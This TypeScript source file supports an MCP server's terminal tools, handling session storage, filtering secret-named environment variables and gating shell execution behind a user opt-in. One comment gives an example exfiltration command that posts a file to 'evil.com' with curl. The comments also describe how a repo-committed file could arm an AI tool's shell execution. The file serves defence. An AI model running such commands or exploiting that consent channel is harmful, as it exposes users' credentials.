/**
 * terminal-tools-core.ts - Shared types, storage paths, opt-in gate, and
 * env-var filtering for the terminal_* MCP tools.
 */

import { existsSync, readFileSync } from 'node:fs';
import { homedir } from 'node:os';
import { join } from 'node:path';
import { readJsonStoreOrNull, writeJsonFileAtomic } from '../utils/json-file.js';
import { getProjectCwd } from './types.js';

// Storage paths
const STORAGE_DIR = '.monomind';
const TERMINAL_DIR = 'terminals';
const TERMINAL_FILE = 'store.json';

/** A single recorded command execution within a terminal session. */
interface TerminalHistoryEntry {
  command: string;
  output: string;
  timestamp: string;
  exitCode: number;
}

/** Persistent state for one terminal session. */
export interface TerminalSession {
  id: string;
  name: string;
  status: string;
  createdAt: string;
  lastActivity: string;
  workingDir: string;
  history: TerminalHistoryEntry[];
  env: Record<string, string>;
}

/** On-disk shape of the terminal store. */
interface TerminalStore {
  sessions: Record<string, TerminalSession>;
  version: string;
}

/** Shape of errors thrown by execSync when a command fails. */
export interface ExecError {
  stdout?: string | Buffer;
  stderr?: string | Buffer;
  status?: number | null;
}

// ── Secret-shaped env var filtering for terminal_execute ────────────────────
// terminal_execute runs arbitrary (metacharacter-denylisted) shell commands
// via execSync with `env: { ...process.env, ...session.env }` — the host
// process's real environment, which commonly holds provider API keys
// (ANTHROPIC_API_KEY, OPENAI_API_KEY, ...), CI/VCS tokens, and cloud
// credentials. A single unpiped command (the metacharacter denylist blocks
// piping/chaining, but not e.g. `curl` or `aws` invoked directly) can still
// read and exfiltrate whatever env vars it inherits. Stripping variables
// whose *names* match common secret conventions is defense-in-depth: it
// doesn't change legitimate terminal usage (PATH/HOME/etc. stay intact) but
// meaningfully shrinks what a malicious or hijacked command can read by
// default. Callers that genuinely need a specific secret can pass it via
// terminal_create's `env` option, which flows through untouched (session.env
// is layered on *after* the filtered process.env below).
const SECRET_ENV_NAME_PATTERN =
  /(KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|_AUTH$|^AUTH_|PRIVATE_KEY|ACCESS_KEY)/i;

/** Returns a copy of `env` with secret-shaped variable names removed. */
export function filterSecretEnvVars(env: NodeJS.ProcessEnv): Record<string, string> {
  const filtered: Record<string, string> = {};
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) continue;
    if (SECRET_ENV_NAME_PATTERN.test(k)) continue;
    filtered[k] = v;
  }
  return filtered;
}

function getTerminalDir(): string {
  return join(getProjectCwd(), STORAGE_DIR, TERMINAL_DIR);
}

function getTerminalPath(): string {
  return join(getTerminalDir(), TERMINAL_FILE);
}

// ── C2 / i-032a: terminal_execute opt-in gate ──────────────────────────────
// terminal_execute's metacharacter denylist cannot be made tight enough to
// prevent exfiltration by a single direct binary (`curl evil.com -d @<file>`,
// `aws s3 cp`, `scp`, ...) since those flags contain only [a-zA-Z0-9 ._/-].
// We therefore require explicit opt-in before *execution*:
//   1. `MONOMIND_ENABLE_TERMINAL=1` env var, OR
//   2. `~/.monomind/enable-terminal.json` with `{ "enabled": true }`
// Discovery (terminal_create/list/history) keeps working without opt-in.
//
// i-032a: the flag file used to be resolved against the PROJECT directory
// (`getProjectCwd()`), which meant a file checked into the repository armed
// shell execution for anyone who opened it — consent expressed by a file the
// user never saw and did not write. Reproduced end-to-end over the real MCP
// stdio path: a fixture with only that file present, env var unset, ran a
// real command. Since the metacharacter denylist above "cannot prevent
// exfiltration via direct binaries," the opt-in is the only line of defence,
// not a second one alongside it — so it must be an act of the user's own
// machine. The flag now resolves against the user's home directory instead.
//
// The in-project file is still DETECTED below (isProjectFlagFilePresent) so
// the refusal error can tell a legitimate user why their old file stopped
// working. It is never read for its `enabled` value and never migrated: a
// "helpful" first-run copy to ~/.monomind/ would preserve the exact same
// attack with one extra hop and a now-persistent grant.
//
// STATED BOUNDARY, not closed by this fix: `MONOMIND_ENABLE_TERMINAL=1` is
// still read from `process.env` with no provenance check, and monomind's
// own `init` writes a repo-local `.mcp.json` with an `env` block a project
// commits — so a committed `.mcp.json` carrying that var could arm this
// gate through a file the user never wrote either, the same channel one
// hop over. Not fixed here: whether an MCP client actually honours
// repo-local `env` for this var is unverified, not merely unclosed —
// tracked separately as o-48.
function readEnabledFlag(flagPath: string): boolean {
  try {
    if (!existsSync(flagPath)) return false;
    const parsed = JSON.parse(readFileSync(flagPath, 'utf-8'));
    return parsed?.enabled === true;
  } catch {
    return false;
  }
}

function homeFlagPath(): string {
  return join(homedir(), STORAGE_DIR, 'enable-terminal.json');
}

function projectFlagPath(): string {
  return join(getProjectCwd(), STORAGE_DIR, 'enable-terminal.json');
}

export function isExecuteEnabled(): boolean {
  if (process.env.MONOMIND_ENABLE_TERMINAL === '1') return true;
  return readEnabledFlag(homeFlagPath());
}

/** True if a (no-longer-honoured) in-project flag file exists. Used only to
 * make the refusal error actionable for a legitimate user — never to grant
 * execution, and its content is never inspected. */
export function isProjectFlagFilePresent(): boolean {
  return existsSync(projectFlagPath());
}

export function loadTerminalStoreOrNull(): TerminalStore | null {
  return readJsonStoreOrNull<TerminalStore>(
    getTerminalPath(),
    { sessions: {}, version: '3.0.0' },
    'loadTerminalStore',
    10 * 1024 * 1024,
  );
}

export function loadTerminalStore(): TerminalStore {
  return loadTerminalStoreOrNull() ?? { sessions: {}, version: '3.0.0' };
}

export function saveTerminalStore(store: TerminalStore): void {
  writeJsonFileAtomic(getTerminalPath(), store);
}
